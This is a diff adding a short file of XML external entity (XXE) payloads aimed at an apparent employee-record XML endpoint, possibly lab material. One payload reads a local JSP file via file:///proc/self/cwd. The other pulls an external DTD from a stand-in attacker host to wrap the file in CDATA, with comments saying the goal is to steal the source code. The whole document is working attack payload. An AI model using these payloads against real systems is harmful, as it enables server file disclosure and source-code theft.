@@ -1,0 +1,12 @@
+<!DOCTYPE root [ <!ENTITY lastname SYSTEM "file:///proc/self/cwd/webapps/ROOT/index.jsp" > ]><employee id="1"><name>Amy &lastname;</name><salary>6000.0</salary></employee>
+
+# This fails because there are bad characters within the file
+
+<!DOCTYPE root [ 
+<!ENTITY % content SYSTEM "file:///proc/self/cwd/webapps/ROOT/index.jsp">
+<!ENTITY % dtd SYSTEM 'http://attackerserver-jaxb:8888/readillegal.dtd'>
+%dtd; 
+]>
+<employee id="1"><name>Amy &filecontent;</name><salary>6000.0</salary></employee>
+
+# The above uses the CDATA wrapper so that bad characters are escaped and thus we can steal the source code.
